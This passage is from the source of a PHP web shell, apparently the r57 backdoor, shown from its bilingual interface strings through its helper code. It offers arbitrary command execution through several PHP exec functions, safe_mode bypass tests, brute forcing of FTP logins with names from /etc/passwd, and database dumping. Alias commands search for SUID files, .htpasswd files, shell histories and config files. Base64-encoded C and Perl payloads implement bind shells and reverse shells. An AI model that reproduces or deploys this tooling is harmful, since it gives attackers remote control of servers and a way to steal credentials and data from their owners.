'ru_text56'=>'Íè÷åãî íå íàéäåíî',
'ru_text57'=>'Ñîçäàòü/Óäàëèòü Ôàéë/Äèðåêòîðèþ',
'ru_text58'=>'Èìÿ',
'ru_text59'=>'Ôàéë',
'ru_text60'=>'Äèðåêòîðèþ',
'ru_butt13'=>'Ñîçäàòü/Óäàëèòü',
'ru_text61'=>'Ôàéë ñîçäàí',
'ru_text62'=>'Äèðåêòîðèÿ ñîçäàíà',
'ru_text63'=>'Ôàéë óäàëåí',
'ru_text64'=>'Äèðåêòîðèÿ óäàëåíà',
'ru_text65'=>'Ñîçäàòü',
'ru_text66'=>'Óäàëèòü',
'ru_text67'=>'Chown/Chgrp/Chmod',
'ru_text68'=>'Êîìàíäà',
'ru_text69'=>'Ïàðàìåòð1',
'ru_text70'=>'Ïàðàìåòð2',
'ru_text71'=>"Âòîðîé ïàðàìåòð êîìàíäû:\r\n- äëÿ CHOWN - èìÿ íîâîãî ïîëüçîâàòåëÿ èëè åãî UID (÷èñëîì) \r\n- äëÿ êîìàíäû CHGRP - èìÿ ãðóïïû èëè GID (÷èñëîì) \r\n- äëÿ êîìàíäû CHMOD - öåëîå ÷èñëî â âîñüìåðè÷íîì ïðåäñòàâëåíèè (íàïðèìåð 0777)",
'ru_text72'=>'Òåêñò äëÿ ïîèñêà',
'ru_text73'=>'Èñêàòü â ïàïêå',
'ru_text74'=>'Èñêàòü â ôàéëàõ',
'ru_text75'=>'* ìîæíî èñïîëüçîâàòü ðåãóëÿðíîå âûðàæåíèå',
'ru_text76'=>'Ïîèñê òåêñòà â ôàéëàõ ñ ïîìîùüþ óòèëèòû find',
'ru_text80'=>'Òèï',
'ru_text81'=>'Ñåòü',
'ru_text82'=>'Áàçû äàííûõ',
'ru_text83'=>'Âûïîëíåíèå SQL çàïðîñà',
'ru_text84'=>'SQL çàïðîñ',
'ru_text85'=>'Ïðîâåðêà âîçìîæíîñòè îáõîäà îãðàíè÷åíèé safe_mode ÷åðåç âûïîëíåíèå êîìàíä â MSSQL ñåðâåðå',
'ru_text86'=>'Ñêà÷èâàíèå ôàéëà ñ ñåðâåðà',
'ru_butt14'=>'Ñêà÷àòü',
'ru_text87'=>'Ñêà÷èâàíèå ôàéëîâ ñ óäàëåííîãî ftp-ñåðâåðà',
'ru_text88'=>'FTP-ñåðâåð:ïîðò',
'ru_text89'=>'Ôàéë íà ftp ñåðâåðå',
'ru_text90'=>'Ðåæèì ïåðåäà÷è',
'ru_text91'=>'Àðõèâèðîâàòü â',
'ru_text92'=>'áåç àðõèâàöèè',
'ru_text93'=>'FTP',
'ru_text94'=>'FTP-áðóòôîðñ',
'ru_text95'=>'Ñïèñîê ïîëüçîâàòåëåé',
'ru_text96'=>'Íå óäàëîñü ïîëó÷èòü ñïèñîê ïîëüçîâàòåëåé',
'ru_text97'=>'Ïðîâåðåíî êîìáèíàöèé: ',
'ru_text98'=>'Óäà÷íûõ ïîäêëþ÷åíèé: ',
'ru_text99'=>'* â êà÷åñòâå ëîãèíà è ïàðîëÿ èñïîëüçóåòñÿ èìÿ ïîëüçîâàòåëÿ èç /etc/passwd',
'ru_text100'=>'Îòïðàâêà ôàéëîâ íà óäàëåííûé ôòï ñåðâåð',
'ru_text101'=>'Èñïîëüçîâàòü òàêæå ïåðåâåðíóòîå (user -> resu) èìÿ ïîëüçîâàòåëÿ â êà÷åñòâå ïàðîëÿ',
'ru_text102'=>'Ïî÷òà',
'ru_text103'=>'Îòïðàâêà ïèñüìà',
'ru_text104'=>'Îòïðàâêà ôàéëà íà ïî÷òîâûé ÿùèê',
'ru_text105'=>'Êîìó',
'ru_text106'=>'Îò',
'ru_text107'=>'Òåìà',
'ru_butt15'=>'Îòïðàâèòü',
'ru_text108'=>'Òåêñò ïèñüìà',
'ru_text109'=>'Ñâåðíóòü',
'ru_text110'=>'Ðàçâåðíóòü',
'ru_text111'=>'SQL-Ñåðâåð : ïîðò',
'ru_text112'=>'Ïðîâåðêà âîçìîæíîñòè îáõîäà îãðàíè÷åíèé safe_mode ÷åðåç èñïîëüçîâàíèå ôóíêöèè mb_send_mail',
'ru_text113'=>'Ïðîâåðêà âîçìîæíîñòè îáõîäà îãðàíè÷åíèé safe_mode, ïðîñìîòð ëèñòèíãà äèðåêòîðèé ñ èñïîëüçîâàíèåì imap_list',
'ru_text114'=>'Ïðîâåðêà âîçìîæíîñòè îáõîäà îãðàíè÷åíèé safe_mode, ïðîñìîòð ñîäåðæèìîãî ôàéëà ñ èñïîëüçîâàíèåì imap_body',
/* --------------------------------------------------------------- */
'eng_text1' =>'Executed command',
'eng_text2' =>'Execute command on server',
'eng_text3' =>'Run command',
'eng_text4' =>'Work directory',
'eng_text5' =>'Upload files on server',
'eng_text6' =>'Local file',
'eng_text7' =>'Aliases',
'eng_text8' =>'Select alias',
'eng_butt1' =>'Execute',
'eng_butt2' =>'Upload',
'eng_text9' =>'Bind port to /bin/bash',
'eng_text10'=>'Port',
'eng_text11'=>'Password for access',
'eng_butt3' =>'Bind',
'eng_text12'=>'back-connect',
'eng_text13'=>'IP',
'eng_text14'=>'Port',
'eng_butt4' =>'Connect',
'eng_text15'=>'Upload files from remote server',
'eng_text16'=>'With',
'eng_text17'=>'Remote file',
'eng_text18'=>'Local file',
'eng_text19'=>'Exploits',
'eng_text20'=>'Use',
'eng_text21'=>'&nbsp;New name',
'eng_text22'=>'datapipe',
'eng_text23'=>'Local port',
'eng_text24'=>'Remote host',
'eng_text25'=>'Remote port',
'eng_text26'=>'Use',
'eng_butt5' =>'Run',
'eng_text28'=>'Work in safe_mode',
'eng_text29'=>'ACCESS DENIED',
'eng_butt6' =>'Change',
'eng_text30'=>'Cat file',
'eng_butt7' =>'Show',
'eng_text31'=>'File not found',
'eng_text32'=>'Eval PHP code',
'eng_text33'=>'Test bypass open_basedir with cURL functions',
'eng_butt8' =>'Test',
'eng_text34'=>'Test bypass safe_mode with include function',
'eng_text35'=>'Test bypass safe_mode with load file in mysql',
'eng_text36'=>'Database . Table',
'eng_text37'=>'Login',
'eng_text38'=>'Password',
'eng_text39'=>'Database',
'eng_text40'=>'Dump database table',
'eng_butt9' =>'Dump',
'eng_text41'=>'Save dump in file',
'eng_text42'=>'Edit files',
'eng_text43'=>'File for edit',
'eng_butt10'=>'Save',
'eng_text44'=>'Can\'t edit file! Only read access!',
'eng_text45'=>'File saved',
'eng_text46'=>'Show phpinfo()',
'eng_text47'=>'Show variables from php.ini',
'eng_text48'=>'Delete temp files',
'eng_butt11'=>'Edit file',
'eng_text49'=>'Delete script from server',
'eng_text50'=>'View cpu info',
'eng_text51'=>'View memory info',
'eng_text52'=>'Find text',
'eng_text53'=>'In dirs',
'eng_text54'=>'Find text in files',
'eng_butt12'=>'Find',
'eng_text55'=>'Only in files',
'eng_text56'=>'Nothing :(',
'eng_text57'=>'Create/Delete File/Dir',
'eng_text58'=>'name',
'eng_text59'=>'file',
'eng_text60'=>'dir',
'eng_butt13'=>'Create/Delete',
'eng_text61'=>'File created',
'eng_text62'=>'Dir created',
'eng_text63'=>'File deleted',
'eng_text64'=>'Dir deleted',
'eng_text65'=>'Create',
'eng_text66'=>'Delete',
'eng_text67'=>'Chown/Chgrp/Chmod',
'eng_text68'=>'Command',
'eng_text69'=>'param1',
'eng_text70'=>'param2',
'eng_text71'=>"Second commands param is:\r\n- for CHOWN - name of new owner or UID\r\n- for CHGRP - group name or GID\r\n- for CHMOD - 0777, 0755...",
'eng_text72'=>'Text for find',
'eng_text73'=>'Find in folder',
'eng_text74'=>'Find in files',
'eng_text75'=>'* you can use regexp',
'eng_text76'=>'Search text in files via find',
'eng_text80'=>'Type',
'eng_text81'=>'Net',
'eng_text82'=>'Databases',
'eng_text83'=>'Run SQL query',
'eng_text84'=>'SQL query',
'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server',
'eng_text86'=>'Download files from server',
'eng_butt14'=>'Download',
'eng_text87'=>'Download files from remote ftp-server',
'eng_text88'=>'FTP-server:port',
'eng_text89'=>'File on ftp',
'eng_text90'=>'Transfer mode',
'eng_text91'=>'Archivation',
'eng_text92'=>'without archivation',
'eng_text93'=>'FTP',
'eng_text94'=>'FTP-bruteforce',
'eng_text95'=>'Users list',
'eng_text96'=>'Can\'t get users list',
'eng_text97'=>'checked: ',
'eng_text98'=>'success: ',
'eng_text99'=>'* use username from /etc/passwd for ftp login and password',
'eng_text100'=>'Send file to remote ftp server',
'eng_text101'=>'Use reverse (user -> resu) login for password',
'eng_text102'=>'Mail',
'eng_text103'=>'Send email',
'eng_text104'=>'Send file to email',
'eng_text105'=>'To',
'eng_text106'=>'From',
'eng_text107'=>'Subj',
'eng_butt15'=>'Send',
'eng_text108'=>'Mail',
'eng_text109'=>'Hide',
'eng_text110'=>'Show',
'eng_text111'=>'SQL-Server : Port',
'eng_text112'=>'Test bypass safe_mode with function mb_send_mail',
'eng_text113'=>'Test bypass safe_mode, view dir list via imap_list',
'eng_text114'=>'Test bypass safe_mode, view file contest via imap_body',
);
/*
Àëèàñû êîìàíä
Ïîçâîëÿþò èçáåæàòü ìíîãîêðàòíîãî íàáîðà îäíèõ è òåõ-æå êîìàíä. ( Ñäåëàíî áëàãîäàðÿ ìîåé ïðèðîäíîé ëåíè )
Âû ìîæåòå ñàìè äîáàâëÿòü èëè èçìåíÿòü êîìàíäû.
*/
$aliases=array(
'find suid files'=>'find / -type f -perm -04000 -ls',
'find suid files in current dir'=>'find . -type f -perm -04000 -ls',
'find sgid files'=>'find / -type f -perm -02000 -ls',
'find sgid files in current dir'=>'find . -type f -perm -02000 -ls',
'find config.inc.php files'=>'find / -type f -name config.inc.php',
'find config.inc.php files in current dir'=>'find . -type f -name config.inc.php',
'find config* files'=>'find / -type f -name "config*"',
'find config* files in current dir'=>'find . -type f -name "config*"',
'find all writable files'=>'find / -type f -perm -2 -ls',
'find all writable files in current dir'=>'find . -type f -perm -2 -ls',
'find all writable directories'=>'find /  -type d -perm -2 -ls',
'find all writable directories in current dir'=>'find . -type d -perm -2 -ls',
'find all writable directories and files'=>'find / -perm -2 -ls',
'find all writable directories and files in current dir'=>'find . -perm -2 -ls',
'find all service.pwd files'=>'find / -type f -name service.pwd',
'find service.pwd files in current dir'=>'find . -type f -name service.pwd',
'find all .htpasswd files'=>'find / -type f -name .htpasswd',
'find .htpasswd files in current dir'=>'find . -type f -name .htpasswd',
'find all .bash_history files'=>'find / -type f -name .bash_history',
'find .bash_history files in current dir'=>'find . -type f -name .bash_history',
'find all .mysql_history files'=>'find / -type f -name .mysql_history',
'find .mysql_history files in current dir'=>'find . -type f -name .mysql_history',
'find all .fetchmailrc files'=>'find / -type f -name .fetchmailrc',
'find .fetchmailrc files in current dir'=>'find . -type f -name .fetchmailrc',
'list file attributes on a Linux second extended file system'=>'lsattr -va',
'show opened ports'=>'netstat -an | grep -i listen',
'----------------------------------------------------------------------------------------------------'=>'ls -la'
);
$table_up1  = "<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: ";
$table_up2  = " ::</div></b></font></td></tr><tr><td>";
$table_up3  = "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc>";
$table_end1 = "</td></tr>";
$arrow = " <font face=Wingdings color=gray>è</font>";
$lb = "<font color=black>[</font>";
$rb = "<font color=black>]</font>";
$font = "<font face=Verdana size=-2>";
$ts = "<table class=table1 width=100% align=center>";
$te = "</table>";
$fs = "<form name=form method=POST>";
$fe = "</form>";

if(isset($_GET['users']))
 {
 if(!$users=get_users()) { echo "<center><font face=Verdana size=-2 color=red>".$lang[$language.'_text96']."</font></center>"; }
 else
  {
  echo '<center>';
  foreach($users as $user) { echo $user."<br>"; }
  echo '</center>';
  }
 echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die();
 }

if (!empty($_POST['dir'])) { @chdir($_POST['dir']); }
$dir = @getcwd();
$windows = 0;
$unix = 0;
if(strlen($dir)>1 && $dir[1]==":") $windows=1; else $unix=1;
if(empty($dir))
 {
 $os = getenv('OS');
 if(empty($os)){ $os = php_uname(); }
 if(empty($os)){ $os ="-"; $unix=1; }
 else
    {
    if(@eregi("^win",$os)) { $windows = 1; }
    else { $unix = 1; }
    }
 }
if(!empty($_POST['s_dir']) && !empty($_POST['s_text']) && !empty($_POST['cmd']) && $_POST['cmd'] == "search_text")
  {
    echo $head;
    if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text'],$_POST['s_mask']); }
    else { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text']); }
    $sr->SearchText(0,0);
    $res = $sr->GetResultFiles();
    $found = $sr->GetMatchesCount();
    $titles = $sr->GetTitles();
    $r = "";
    if($found > 0)
    {
      $r .= "<TABLE width=100%>";
      foreach($res as $file=>$v)
      {
        $r .= "<TR>";
        $r .= "<TD colspan=2><font face=Verdana size=-2><b>".ws(3);
        $r .= ($windows)? str_replace("/","\\",$file) : $file;
        $r .= "</b></font></ TD>";
        $r .= "</TR>";
        foreach($v as $a=>$b)
        {
          $r .= "<TR>";
          $r .= "<TD align=center><B><font face=Verdana size=-2>".$a."</font></B></TD>";
          $r .= "<TD><font face=Verdana size=-2>".ws(2).$b."</font></TD>";
          $r .= "</TR>\n";
        }
      }
      $r .= "</TABLE>";
    echo $r;
    }
    else
    {
      echo "<P align=center><B><font face=Verdana size=-2>".$lang[$language.'_text56']."</B></font></P>";
    }
  echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
  die();
  }
if(strpos(ex("echo abcr57"),"r57")!=3) { $safe_mode = 1; }
$SERVER_SOFTWARE = getenv('SERVER_SOFTWARE');
if(empty($SERVER_SOFTWARE)){ $SERVER_SOFTWARE = "-"; }
function ws($i)
{
return @str_repeat("&nbsp;",$i);
}
function ex($cfe)
{
 $res = '';
 if (!empty($cfe))
 {
  if(function_exists('exec'))
   {
    @exec($cfe,$res);
    $res = join("\n",$res);
   }
  elseif(function_exists('shell_exec'))
   {
    $res = @shell_exec($cfe);
   }
  elseif(function_exists('system'))
   {
    @ob_start();
    @system($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(function_exists('passthru'))
   {
    @ob_start();
    @passthru($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@is_resource($f = @popen($cfe,"r")))
  {
   $res = "";
   while(!@feof($f)) { $res .= @fread($f,1024); }
   @pclose($f);
  }
 }
 return $res;
}
function get_users()
{
  $users = array();
  $rows=file('/etc/passwd');
  if(!$rows) return 0;
  foreach ($rows as $string)
   {
   	$user = @explode(":",$string);
   	if(substr($string,0,1)!='#') array_push($users,$user[0]);
   }
  return $users;
}
function we($i)
{
if($GLOBALS['language']=="ru"){ $text = 'Îøèáêà! Íå ìîãó çàïèñàòü â ôàéë '; }
else { $text = "[-] ERROR! Can't write in file "; }
echo "<table width=100% cellpadding=0 cellspacing=0><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>".$text.$i."</b></div></font></td></tr></table>";
return null;
}
function re($i)
{
if($GLOBALS['language']=="ru"){ $text = 'Îøèáêà! Íå ìîãó ïðî÷èòàòü ôàéë '; }
else { $text = "[-] ERROR! Can't read file "; }
echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>".$text.$i."</b></div></font></td></tr></table>";
return null;
}
function ce($i)
{
if($GLOBALS['language']=="ru"){ $text = "Íå óäàëîñü ñîçäàòü "; }
else { $text = "Can't create "; }
echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>".$text.$i."</b></div></font></td></tr></table>";
return null;
}
function fe($l,$n)
{
$text['ru']  = array('Íå óäàëîñü ïîäêëþ÷èòüñÿ ê ftp ñåðâåðó','Îøèáêà àâòîðèçàöèè íà ftp ñåðâåðå','Íå óäàëîñü ïîìåíÿòü äèðåêòîðèþ íà ftp ñåðâåðå');
$text['eng'] = array('Connect to ftp server failed','Login to ftp server failed','Can\'t change dir on ftp server');
echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>".$text[$l][$n]."</b></div></font></td></tr></table>";
return null;
}
function mr($l,$n)
{
$text['ru']  = array('Íå óäàëîñü îòïðàâèòü ïèñüìî','Ïèñüìî îòïðàâëåíî');
$text['eng'] = array('Can\'t send mail','Mail sent');
echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>".$text[$l][$n]."</b></div></font></td></tr></table>";
return null;
}
function perms($mode)
{
if ($GLOBALS['windows']) return 0;
if( $mode & 0x1000 ) { $type='p'; }
else if( $mode & 0x2000 ) { $type='c'; }
else if( $mode & 0x4000 ) { $type='d'; }
else if( $mode & 0x6000 ) { $type='b'; }
else if( $mode & 0x8000 ) { $type='-'; }
else if( $mode & 0xA000 ) { $type='l'; }
else if( $mode & 0xC000 ) { $type='s'; }
else $type='u';
$owner["read"] = ($mode & 00400) ? 'r' : '-';
$owner["write"] = ($mode & 00200) ? 'w' : '-';
$owner["execute"] = ($mode & 00100) ? 'x' : '-';
$group["read"] = ($mode & 00040) ? 'r' : '-';
$group["write"] = ($mode & 00020) ? 'w' : '-';
$group["execute"] = ($mode & 00010) ? 'x' : '-';
$world["read"] = ($mode & 00004) ? 'r' : '-';
$world["write"] = ($mode & 00002) ? 'w' : '-';
$world["execute"] = ($mode & 00001) ? 'x' : '-';
if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
$s=sprintf("%1s", $type);
$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
return trim($s);
}
function in($type,$name,$size,$value)
{
 $ret = "<input type=".$type." name=".$name." ";
 if($size != 0) { $ret .= "size=".$size." "; }
 $ret .= "value=\"".$value."\">";
 return $ret;
}
function which($pr)
{
$path = ex("which $pr");
if(!empty($path)) { return $path; } else { return $pr; }
}
function cf($fname,$text)
{
 $w_file=@fopen($fname,"w") or we($fname);
 if($w_file)
 {
 @fputs($w_file,@base64_decode($text));
 @fclose($w_file);
 }
}
function sr($l,$t1,$t2)
 {
 return "<tr class=tr1><td class=td1 width=".$l."% align=right>".$t1."</td><td class=td1 align=left>".$t2."</td></tr>";
 }
if (!@function_exists("view_size"))
{
function view_size($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
}
  function DirFilesR($dir,$types='')
  {
    $files = Array();
    if(($handle = @opendir($dir)))
    {
      while (false !== ($file = @readdir($handle)))
      {
        if ($file != "." && $file != "..")
        {
          if(@is_dir($dir."/".$file))
            $files = @array_merge($files,DirFilesR($dir."/".$file,$types));
          else
          {
            $pos = @strrpos($file,".");
            $ext = @substr($file,$pos,@strlen($file)-$pos);
            if($types)
            {
              if(@in_array($ext,explode(';',$types)))
                $files[] = $dir."/".$file;
            }
            else
              $files[] = $dir."/".$file;
          }
        }
      }
      @closedir($handle);
    }
    return $files;
  }
  class SearchResult
  {
    var $text;
    var $FilesToSearch;
    var $ResultFiles;
    var $FilesTotal;
    var $MatchesCount;
    var $FileMatschesCount;
    var $TimeStart;
    var $TimeTotal;
    var $titles;
    function SearchResult($dir,$text,$filter='')
    {
      $dirs = @explode(";",$dir);
      $this->FilesToSearch = Array();
      for($a=0;$a<count($dirs);$a++)
        $this->FilesToSearch = @array_merge($this->FilesToSearch,DirFilesR($dirs[$a],$filter));
      $this->text = $text;
      $this->FilesTotal = @count($this->FilesToSearch);
      $this->TimeStart = getmicrotime();
      $this->MatchesCount = 0;
      $this->ResultFiles = Array();
      $this->FileMatchesCount = Array();
      $this->titles = Array();
    }
    function GetFilesTotal() { return $this->FilesTotal; }
    function GetTitles() { return $this->titles; }
    function GetTimeTotal() { return $this->TimeTotal; }
    function GetMatchesCount() { return $this->MatchesCount; }
    function GetFileMatchesCount() { return $this->FileMatchesCount; }
    function GetResultFiles() { return $this->ResultFiles; }
    function SearchText($phrase=0,$case=0) {
    $qq = @explode(' ',$this->text);
    $delim = '|';
      if($phrase)
        foreach($qq as $k=>$v)
          $qq[$k] = '\b'.$v.'\b';
      $words = '('.@implode($delim,$qq).')';
      $pattern = "/".$words."/";
      if(!$case)
        $pattern .= 'i';
      foreach($this->FilesToSearch as $k=>$filename)
      {
        $this->FileMatchesCount[$filename] = 0;
        $FileStrings = @file($filename) or @next;
        for($a=0;$a<@count($FileStrings);$a++)
        {
          $count = 0;
          $CurString = $FileStrings[$a];
          $CurString = @Trim($CurString);
          $CurString = @strip_tags($CurString);
          $aa = '';
          if(($count = @preg_match_all($pattern,$CurString,$aa)))
          {
            $CurString = @preg_replace($pattern,"<SPAN style='color: #990000;'><b>\\1</b></SPAN>",$CurString);
            $this->ResultFiles[$filename][$a+1] = $CurString;
            $this->MatchesCount += $count;
            $this->FileMatchesCount[$filename] += $count;
          }
        }
      }
      $this->TimeTotal = @round(getmicrotime() - $this->TimeStart,4);
    }
  }
  function getmicrotime()
  {
    list($usec,$sec) = @explode(" ",@microtime());
    return ((float)$usec + (float)$sec);
  }
$port_bind_bd_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZS
A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I
GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt
b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9
pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULF
NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK
ikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQog
ICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk
7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2
9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld
2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW50ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVu
dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp
lbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCkpDQpyZXR1cm4gMDsNCn0=";
$port_bind_bd_pl="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZiAoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMS
VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs
JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV
TRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw0KbG
lzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspK
Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i
Ow0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3N
lIENPTk47DQpleGl0IDA7DQp9DQp9";
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
$datapipe_c="I2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvd2FpdC5oPg0KI2luY2
